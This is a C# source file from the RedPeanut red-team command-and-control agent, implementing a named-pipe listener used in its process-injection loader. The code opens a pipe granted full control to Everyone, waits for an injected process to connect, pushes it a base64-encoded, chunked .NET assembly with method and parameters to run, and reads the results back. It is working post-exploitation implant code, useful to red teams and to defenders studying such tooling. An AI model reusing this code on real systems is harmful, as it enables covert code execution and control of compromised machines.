//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;
using RedPeanutAgent.Core;

namespace RedPeanutAgent.Execution
{
    class InjectionLoaderListener
    {
        private string pipename = "";
        private bool IsStarted = false;
        private Utility.TaskMsg command = null;

        public InjectionLoaderListener(string pipename, Utility.TaskMsg command)
        {
            this.pipename = pipename;
            this.command = command;
        }

        public bool GetIsStarted()
        {
            return IsStarted;
        }

        // Server main thread
        public string Execute(IntPtr hProcess, IntPtr hReadPipe)
        {

            IsStarted = true;

            PipeSecurity ps = new PipeSecurity();
            //ps.SetAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.ReadWrite, AccessControlType.Allow));
            //ps.AddAccessRule(new PipeAccessRule(WindowsIdentity.GetCurrent().User, PipeAccessRights.FullControl, AccessControlType.Allow));
            ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));


            NamedPipeServerStream pipe = new NamedPipeServerStream(pipename, PipeDirection.InOut,
                NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message, PipeOptions.Asynchronous, 4098, 4098, ps);
            Console.WriteLine("Wait");
            pipe.WaitForConnection();

            SendCommand(pipe, command);
            StringBuilder output = ReadOutput(hProcess, hReadPipe);

            return output.ToString();

        }

        private void SendCommand(NamedPipeServerStream pipe, Utility.TaskMsg task)
        {
            try
            {
                if (task.ModuleTask.Assembly.Length > 2048)
                {
                    int achunksize = 1024;
                    Utility.TaskMsg ctask = new Utility.TaskMsg
                    {
                        TaskType = task.TaskType,
                        Agentid = task.Agentid,
                        AgentPivot = task.AgentPivot,
                        Chunked = true
                    };

                    string assembly = task.ModuleTask.Assembly;
                    //Chunnk number
                    int chunks = assembly.Length / achunksize;
                    if (assembly.Length % achunksize != 0)
                        chunks++;

                    ctask.ChunkNumber = chunks;

                    Utility.ModuleConfig cmodconf = new Utility.ModuleConfig
                    {
                        Method = task.ModuleTask.Method,
                        Moduleclass = task.ModuleTask.Moduleclass,
                        Parameters = task.ModuleTask.Parameters
                    };

                    int iter = 0;
                    do
                    {
                        //Console.WriteLine("Sendcommand iter " + iter);
                        int remaining = assembly.Length - (iter * achunksize);
                        if (remaining > achunksize)
                            remaining = achunksize;

                        cmodconf.Assembly = assembly.Substring(iter * achunksize, remaining);
                        ctask.ModuleTask = cmodconf;

                        string responsechunkmsg = new JavaScriptSerializer().Serialize(ctask);
                        //Console.WriteLine("Sendcommand responsechunkmsg " + responsechunkmsg);
                        byte[] responsechunkmsgbyte = Encoding.Default.GetBytes(responsechunkmsg);

                        var responsechunk = Encoding.Default.GetBytes(Convert.ToBase64String(responsechunkmsgbyte));

                        pipe.Write(responsechunk, 0, responsechunk.Length);

                        iter++;
                    }
                    while (chunks > iter);

                }
                else
                {
                    task.Chunked = false;
                    string command_src = new JavaScriptSerializer().Serialize(task);
                    byte[] taskbyte = Encoding.Default.GetBytes(command_src);
                    string taskb64 = Convert.ToBase64String(taskbyte);
                    pipe.Write(Encoding.Default.GetBytes(taskb64), 0, Encoding.Default.GetBytes(taskb64).Length);
                }
                Console.WriteLine("End sendcommand");
            }
            catch (Exception e)
            {
                Console.WriteLine("Error during sendcommand {0}", e.Message);
            }
        }

        private StringBuilder ReadOutput(IntPtr hProcess, IntPtr hReadPipe)
        {
            bool bSuccess;
            uint dwRead = 0;
            StringBuilder output = new StringBuilder();
            byte[] chBuf = new byte[1024];
            uint exitCode;
            bool ok;

            do
            {
                Thread.Sleep(500);
                exitCode = 0;
                ok = Natives.GetExitCodeProcess(hProcess, out exitCode);
                //Console.WriteLine("ok " + ok + " " + exitCode);
                bSuccess = Natives.ReadFile(hReadPipe, chBuf, 1024, out dwRead, IntPtr.Zero);
                //Console.WriteLine("1 bSuccess " + bSuccess + " dwRead " + dwRead);
                if (!bSuccess || dwRead == 0)
                {
                    break;
                }

                output.Append(Encoding.Default.GetString(chBuf).Substring(0, (int)dwRead));

            } while (bSuccess && dwRead != 0 && ((exitCode == 259 || !ok) || dwRead == 1024));

            byte[] tmp64 = Convert.FromBase64String(output.ToString());
            return new StringBuilder(Encoding.Default.GetString(tmp64));
        }

    }
}
